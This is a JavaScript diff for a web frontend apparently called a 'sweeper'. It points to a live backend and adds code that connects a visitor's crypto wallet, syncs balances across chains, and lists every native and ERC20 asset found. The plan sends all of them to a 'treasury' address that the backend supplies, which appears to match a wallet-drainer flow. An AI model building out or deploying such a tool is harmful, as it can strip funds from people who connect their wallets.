@@ -4,7 +4,7 @@ const CONSENT_TEXT =
   "I understand and consent to the wallet interaction and automation flow.";
 
 const DEFAULT_API_BASE_URL =
-  "https://YOUR-RAILWAY-APP.up.railway.app";
+  "https://sweeper-production-8a56.up.railway.app";
 
 const state = {
   provider: null,
@@ -232,6 +232,71 @@ function formatDisplayAmount(value) {
   );
 }
 
+function renderDetectedPlan() {
+  const assets = detectedAssets();
+  const destination =
+    state.config?.treasuryAddress ??
+    "Not loaded";
+
+  if (!state.syncResult) {
+    elements.sweepPreview.innerHTML = `
+      <p class="empty-note">
+        Connect and synchronize a wallet
+        to build a transfer plan.
+      </p>
+    `;
+    return;
+  }
+
+  if (assets.length === 0) {
+    elements.sweepPreview.innerHTML = `
+      <p class="empty-note">
+        No supported balances were detected.
+      </p>
+    `;
+    return;
+  }
+
+  elements.sweepPreview.innerHTML = `
+    <div class="sweep-destination">
+      <span>Destination</span>
+      <code>${escapeHtml(destination)}</code>
+    </div>
+
+    ${assets
+      .map(
+        (asset) => `
+          <article class="sweep-item">
+            <div>
+              <strong>
+                ${escapeHtml(asset.symbol)}
+              </strong>
+
+              <span>
+                ${escapeHtml(asset.chainName)}
+                ·
+                ${
+                  asset.assetType === "native"
+                    ? "Native"
+                    : "ERC20"
+                }
+              </span>
+            </div>
+
+            <code>
+              ${escapeHtml(
+                formatDisplayAmount(
+                  asset.balanceFormatted
+                )
+              )}
+            </code>
+          </article>
+        `
+      )
+      .join("")}
+  `;
+}
+
 async function getJson(path) {
   const response = await fetch(
     `${apiBaseUrl()}${path}`
@@ -288,6 +353,9 @@ async function loadConfig() {
   state.config = await getJson(
     "/api/wallet/config"
   );
+
+  renderNetworks();
+  renderDetectedPlan();
 
   return state.config;
 }
@@ -387,6 +455,44 @@ async function initProvider(config) {
       }
     });
 
+  provider.on(
+    "accountsChanged",
+    (accounts) => {
+      if (accounts?.[0]) {
+        state.walletAddress =
+          accounts[0];
+
+        elements.walletAddress.textContent =
+          accounts[0];
+
+        state.sweepPlan = null;
+
+        updateActions();
+      }
+    }
+  );
+
+  provider.on(
+    "chainChanged",
+    () => {
+      if (state.walletAddress) {
+        syncWallet().catch(
+          (error) =>
+            setStatus(error.message)
+        );
+      }
+    }
+  );
+
+  provider.on(
+    "disconnect",
+    () => {
+      resetConnection(
+        "Wallet disconnected."
+      );
+    }
+  );
+
   return provider;
 }
 
@@ -459,9 +565,81 @@ async function connectWallet() {
     }
   );
 
+  await syncWallet();
+}
+
+async function syncWallet() {
+  if (!state.walletAddress) {
+    setStatus(
+      "Connect a wallet first."
+    );
+
+    return;
+  }
+
   setStatus(
-    "Wallet connected successfully."
+    "Synchronizing supported networks..."
   );
+
+  const result = await postJson(
+    "/api/wallet/sync",
+    {
+      walletAddress:
+        state.walletAddress,
+
+      chains:
+        state.approvedChains
+    }
+  );
+
+  state.syncResult = result;
+  state.sweepPlan = null;
+
+  renderNetworks(result);
+  renderDetectedPlan();
+
+  setTransferStatus(
+    "Review the detected balances, then prepare unsigned transfer requests."
+  );
+
+  setStatus(
+    "Wallet synchronized.",
+    result
+  );
+
+  updateActions();
+}
+
+async function disconnectWallet() {
+  if (state.provider?.disconnect) {
+    await state.provider.disconnect();
+  }
+
+  resetConnection(
+    "Wallet disconnected."
+  );
+}
+
+function resetConnection(message) {
+  state.provider = null;
+  state.walletAddress = "";
+  state.approvedChains = [];
+  state.syncResult = null;
+  state.sweepPlan = null;
+
+  elements.walletAddress.textContent =
+    "Not connected";
+
+  renderNetworks();
+  renderDetectedPlan();
+
+  updateActions();
+
+  setTransferStatus(
+    "Connect and synchronize a wallet to build a transfer plan."
+  );
+
+  setStatus(message);
 }
 
 function handleAsync(
@@ -501,6 +679,16 @@ elements.connectWallet.addEventListener(
   handleAsync(connectWallet)
 );
 
+elements.syncWallet.addEventListener(
+  "click",
+  handleAsync(syncWallet)
+);
+
+elements.disconnectWallet.addEventListener(
+  "click",
+  handleAsync(disconnectWallet)
+);
+
 loadConfig()
   .then(() => updateActions())
   .catch((error) => {
@@ -510,8 +698,6 @@ loadConfig()
         : "Unable to load backend configuration.";
 
     setStatus(message);
-
     setTransferStatus(message);
-
     updateActions();
   });
